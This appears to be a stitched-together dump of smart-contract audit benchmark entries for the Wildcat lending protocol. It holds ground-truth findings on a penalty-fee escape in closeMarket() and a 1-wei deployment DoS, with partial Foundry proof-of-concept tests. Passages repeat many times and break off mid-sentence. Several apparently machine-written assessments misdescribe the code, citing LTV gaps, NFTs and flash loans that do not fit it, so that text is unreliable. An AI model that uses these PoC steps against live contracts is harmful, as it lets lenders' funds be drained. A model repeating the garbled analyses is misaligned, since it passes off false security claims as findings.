        "gt": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

This means that any user can call this function and manipulate the state of the contract, including transferring assets or interacting with other contracts.\n2. The function allows the external caller to specify arbitrary target addresses as part of its parameters. This is a potential vulnerability because the function does not adequately validate these addresses before allowing them to be used. An attacker could potentially input malicious or attacker-controlled addresses, leading to unintended operations being performed on the contract's state.\n3.

However, the function does not adequately validate that the caller is authorized to perform these operations on behalf of the affected assets, leading to an oversight in access control.\n\nTo confirm whether this vulnerability exists in the smart contract code, we can analyze the `_getUpdatedState` function and the `totalAssets` and `state.totalDebts` functions. If these functions are properly validating access control and input parameters, then the potential vulnerability may be mitigated.

Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

The vulnerability is related to the lack of a gap between the maximal Loan-to-Value (LTV) and the liquidation LTV in a lending protocol.\n\nThe function takes three parameters: `MarketState`, `delinquencyGracePeriod`, and `timeDelta`. `MarketState` contains information about the state of the market, such as whether the borrower is delinquent or not, and the total time in delinquency. `delinquencyGracePeriod` represents the amount of time that a borrower has to avoid liquidation after becoming delinquent. `timeDelta` represents the amount of time elapsed since the last update to the `MarketState`.\n\nThe function updates the `timeDelinquent` field of the `MarketState` object based on the current state and the elapsed time. If the borrower is currently delinquent, the function increases the total time in delinquency by the elapsed time. However, if the borrower is not delinquent, the function reduces the total time in delinquency by the elapsed time, but only up to the amount of time that has already passed outside of the grace period.\n\nThe vulnerability arises when there is no gap between the maximal LTV and the liquidation LTV in a lending protocol, allowing users to be liquidated immediately after taking maximal debt. In this case, the `timeDelinquent` field of the `MarketState` object can become equal to the delinquency grace period, which could lead to a situation where a borrower is not actually delinquent but still faces potential liquidation due to the lack of a gap between LTVs.\n\nTherefore, I would answer that this function is vulnerable to the \"Lack of Gap Between LTVs\" vulnerability type, and the reason for this is that the `timeDelinquent` field of the `MarketState` object can become equal to the delinquency grace period if the borrower is not actually delinquent but still faces potential liquidation due to the lack of a gap between LTVs.\n\nTo mitigate",

        "gt": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

This vulnerability could be exploited by an attacker who can alter the state of the contract, potentially causing economic exploits or even bricking of integrated contracts.\n2.

Use of \"toUint112\" function: The use of the \"toUint112\" function in conjunction with the \"uint256\" type suggests that there may be a potential overflow vulnerability, as it can truncate data to 112 bits.

        "gtraw": "\n# Vulnerability details\n\nTo explain this issue, I will need to mention two things: the fee structure of the protocol and how closing a market works. Let's start with the fees.\n\nLenders earn interest with two different types of fees: Base interest and delinquency fee. The base interest depends on the annual interest rate of the market and it is paid by the borrower no matter what. On the other hand, the delinquency fee is a penalty fee and it is paid by the borrower if the reserves of the market drop below the required reserves amount.\n\nThe important part is how the penalty fees are calculated and I'll be focusing on penalty fees at the moment.  \nEvery market has a delinquency grace period, which is a period that is not penalized. If a market is delinquent but the grace period is not passed yet, there is no penalty fee. After the grace period is passed, the penalty fee is applied.\n\nThe most crucial part starts now: The penalty fee does not become 0 immediately after the delinquency is cured. The penalty fee is still being applied even after the delinquency is cured until the grace tracker counts down to zero.\n\nAn example from the protocol [gitbook/borrowers section is](https://wildcat-protocol.gitbook.io/wildcat/using-wildcat/day-to-day-usage/borrowers): *\"Note: this means that if a markets grace period is 3 days, and it takes 5 days to cure delinquency, this means that* ***4*** *days of penalty APR are paid.\"*\n\nHere you can find the code snippet of penalty fee calculation:  \n\n\n---\n\nNow, let's check how to close a market and here is the `closeMarket()` function:\n\n```solidity\nfile: WildcatMarket.sol\n142.  function closeMarket() external onlyController nonReentrant {\n143.    MarketState memory state = _getUpdatedState();\n144.    state.annualInterestBips = 0;\n145.    state.isClosed = true;\n146.    state.reserveRatioBips = 0;\n147.    if (_withdrawalData.unpaidBatches.length() > 0) {\n148.      revert CloseMarketWithUnpaidWithdrawals();\n149.    }\n150.    uint256 currentlyHeld = totalAssets();\n151.@>  uint256 totalDebts = state.totalDebts(); //@audit-issue Current debt is calculated with the current scaleFactor. It doesn't check if there are remaining \"state.timeDelinquent\" to pay penalty fees. \n152.    if (currentlyHeld < totalDebts) {\n153.      // Transfer remaining debts from borrower\n154.@>    asset.safeTransferFrom(borrower, address(this), totalDebts - currentlyHeld); //@audit remaining debt is transferred and market is closed, but if the market was delinquent for a while, debt will keep increasing. Total assets will not cover the total debt\n155.    } else if (currentlyHeld > totalDebts) {\n156.      // Transfer excess assets to borrower\n157.      asset.safeTransfer(borrower, currentlyHeld - totalDebts);\n158.    }\n159.    _writeState(state);\n160.    emit MarketClosed(block.timestamp);\n161.  }\n```\n\n\n\nWhile closing the market, the total debt is calculated and the required amount is transferred to the market. This way all debts are covered. However, the covered total debt is calculated with the current scale factor. As you can see above, this function does not check if there are still penalties to be paid. It should have checked the `state.timeDelinquent`.\n\nIf the `state.timeDelinquent > grace period` when closing the market *(which means the borrower still has more penalties to pay)*, the scale factor will keep increasing after every state update.\n\nThe borrower didn't pay the remaining penalties when closing the market, but who will pay it?\n\n* Lenders will keep earning those penalty fees (*the base rate will be 0 after closing, but the penalty fee will still accumulate*)\n    \n* Lenders will start withdrawing their funds.\n    \n* All lenders except the last one will withdraw `the exact debt to the lender when closed + the penalty fee after closing`.\n    \n* The last lender will not even be able to withdraw `the exact debt to the lender when closed` because some portion of the funds dedicated to the last lender are already transferred to the previous lenders as the penalty fee.\n    \n\nThe borrower might intentionally do it to escape from the penalty, or the borrower may not even be aware of the situation.\n\n1. The borrower had a cash flow problem after taking the debt\n    \n2. The market stayed delinquent for a long time\n    \n3. The borrower found some funds\n    \n4. The borrower wanted to close the high-interest debts right after finding some funds\n    \n5. Immediately paid everything and closed the market while the market was still delinquent.\n    \n6. From the borrower's perspective, they paid all of their debt while closing the market.\n\n7. But in reality, the borrower only paid the half of the penalty fee (while the counter was counting up). But the second half of the penalties, which will be accumulated while the counter was counting down, is not paid by the borrower. \n    \nThe protocol does not check if there are remaining penalties, and doesn't charge the borrower enough while closing the market.\n \nI provided a coded PoC below that shows every step of the vulnerability.\n\n## Impact\n- The borrower will pay only half of the penalty while closing the market. \n- The other half of the penalty will keep accumulating.\n- One of the lenders (the last one to withdraw) will have to cover those unpaid penalties.\n\nBorrowers who are aware of this may create charming markets with lower base rate but higher penalty rate (They know they won't pay the half of it). \nOr the borrowers may not be aware of this, but the protocol doesn't take the required penalty from them. They \"unintentionally\" not pay the penalty, but the lender will have to cover it. \n\n## Proof of Concept\n### Coded PoC\n\nYou can use the protocol's own test setup to prove this issue.  \n\\- Copy the snippet below, and paste it into the `WildcatMarket.t.sol` test file.  \n\\- Run it with `forge test --match-test test_closeMarket_withoutPaying_HalfofThePenalty -vvv`\n\n```solidity\n// @audit Not pay the half, leave it to the last lender\n  function test_closeMarket_withoutPaying_HalfofThePenalty() external {\n    // -----------------------------------------CHAPTER ONE - PREPARE--------------------------------------------------------------------------------\n    // ------------------------------DEPOSIT - BORROW - WITHDRAW -> MARKET IS DELINQUENT-------------------------------------------------------------\n\n    // Alice and Bob deposit 50k each, borrower borrows 80% \n    _authorizeLender(bob);\n    vm.prank(alice);\n    market.depositUpTo(50_000e18);\n    vm.prank(bob);\n    market.depositUpTo(50_000e18);\n    vm.prank(borrower);\n    market.borrow(80_000e18);\n    \n    // Alice and Bob request withdrawal for 10k each, reserve will be 0, market will be delinquent.\n    vm.prank(alice);\n    market.queueWithdrawal(10_000e18);\n    vm.prank(bob);\n    market.queueWithdrawal(10_000e18);\n    // skip withdrawal batch duration\n    skip(1 days);\n    market.executeWithdrawal(alice, 86401); //86401 is the batch expiry.

This can easily be done by checking `state.timeDelinquent` in the `closeMarket()` function.\n\nThat one is simple, but I don't think it is fair for the borrower because the borrower will have to pay the base rate too for that additional amount of time. Maybe the borrower will be inclined to pay the `current debt + future penalties` and close the market as soon as possible.\n\nThat's why I think closing the market can still be allowed even if there are penalties to accumulate. However, the problem with that one is we can not know the exact amount of future penalties due to the compounding mechanism. It will depend on how many times the state is updated while the grace counter counts down.\n\nTherefore I believe a buffer amount should be added. If the borrowers want to close the market, they should pay `current debt + expected future penalties + buffer amount`, and the excess amount from the buffer should be transferred back to the borrower after every lender withdraws their funds.\n\n\n\n\n\n## Assessed type\n\nContext",

The reason for this vulnerability is that the multiplication of three uint112 numbers can result in a number with up to 36 decimals, which exceeds the maximum representable value for a uint112 data type.\n\nTo mitigate this vulnerability, it is recommended to use safe math libraries like OpenZeppelin's SafeMath library or to check for overflow/underflow conditions manually before performing arithmetic operations.

This effectively locks the `borrower` out of all protocol functionality forever since he can never deploy a market controller for himself.\n\n## Impact\n\nAn attacker can do the following at the cost of 1 wei and some gas:\n\n- Permanently lock a registered borrower out of all borrowing-related functionality by forcing `deployController()` to always revert for his address.\n- Grief market deployments by causing `deployMarket()` to always revert for a given `borrower`, `lender` and `market`.\n- Cause a sanctioned lender to lose all his funds in a market when `nukeFromOrbit()` or `executeWithdrawal()` is called for his address.\n\n## Proof of Concept\n\nThe code below contains three tests:\n- `test_CanDOSControllerDeployment()` demonstrates how an attacker can force `deployController()` to revert permanently for a borrower by transferring 1 wei to the computed controller address.\n- `test_CanDOSMarketDeployment()` demonstrates how `deployMarket()` can be forced to revert with the same attack.\n- `test_CanSkipEscrowDeployment()` shows how an attacker can skip the escrow deployment for a lender if he gets blocked, causing his market tokens to be unrecoverable.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.20;\n\nimport 'src/WildcatSanctionsSentinel.sol';\nimport 'src/WildcatArchController.sol';\nimport

This allows the borrower to manipulate the system by exploiting the lack of checks-effects-interactions pattern, allowing them to keep the NFT, loan amount, and accrued interest.\n\nThe vulnerability is caused by the fact that the \"createEscrow\" function first creates a new escrow contract using the \"WildcatSanctionsEscrow\" constructor, which is not marked as reentrant.

In this case, we will assess whether the smart contract is vulnerable to a flash loan attack.\n\nFirstly, let's review the functionality of the given code:\n\n1. The `createEscrow` function creates an escrow contract for a borrower and account address using the specified asset address as the collateral type.\n2. If the market where the escrow is created is not registered, the transaction reverts with a \"NotRegisteredMarket\" error message.\n3. The `getEscrowAddress` function returns the existing escrow contract address for the specified borrower and asset type if it exists, otherwise it creates a new escrow contract using the `TmpEscrowParams` struct to initialize the escrow state variables.\n4. The `sanctionOverrides` mapping is updated with the newly created escrow contract address and sets the override status to true for the specified borrower.\n5. An event log is emitted when a new escrow contract is created or an existing one is reused.\n6. Finally, the `_resetTmpEscrowParams` function resets the temporary escrow parameters struct to its default state.\n\nNow, let's assess whether this code is vulnerable to a flash loan attack:\n\n1. The `createEscrow` function allows any address to call it and create an escrow contract for another user's loan if they know the borrower's address and asset type. This opens up the possibility of a malicious actor creating an escrow contract for a user who is not the intended recipient, leading to a flash loan attack.\n2. The `getEscrowAddress` function checks whether an existing escrow contract exists for the specified borrower and asset type before creating a new one, but it does not check if the existing escrow contract belongs to the same address that called the `createEscrow` function. This means that another malicious actor could create an escrow contract with the intention of intercepting the loan repayments from the intended borrower.\n3. The `sanctionOverrides` mapping is publicly accessible, which allows any address to modify the override status for a particular escrow contract",
                "poc_patch": "  Yes, the given smart contract code is vulnerable to a \"Smart Contract DoS\" attack. The vulnerability lies in the `createEscrow` function, specifically the line `new WildcatSanctionsEscrow{ salt: keccak256(abi.encode(borrower, account, asset)) }();`\n\nThis line creates a new instance of the `WildcatSanctionsEscrow` contract using the `salt` argument. The `salt` argument is computed as the result of the `keccak256` hash function applied to the concatenation of the `borrower`, `account`, and `asset` parameters.\n\nThe vulnerability arises from the fact that an attacker can control at least one of these three parameters (`borrower`, `account`, or `asset`) in order to create a malicious escrow contract with a predictable address. By doing so, the attacker can cause the smart contract to revert when trying to deploy the new escrow contract, leading to a denial-of-service (DoS) attack on the entire platform.\n\nTo exploit this vulnerability, an attacker would need to have control over at least one of these three parameters in order to create a malicious escrow contract with a predictable address. Once the attacker has created such an escrow contract, they can cause the smart contract to revert, leading to a denial-of-service (DoS) attack on the entire platform.\n\nTo patch this vulnerability, you could add additional checks in the `createEscrow` function to ensure that the address of the new escrow contract is not predictable and that the parameters passed to the function are valid. For example, you could check that the `borrower`, `account`, and `asset` parameters are all valid addresses and that the `salt` argument is a random value.

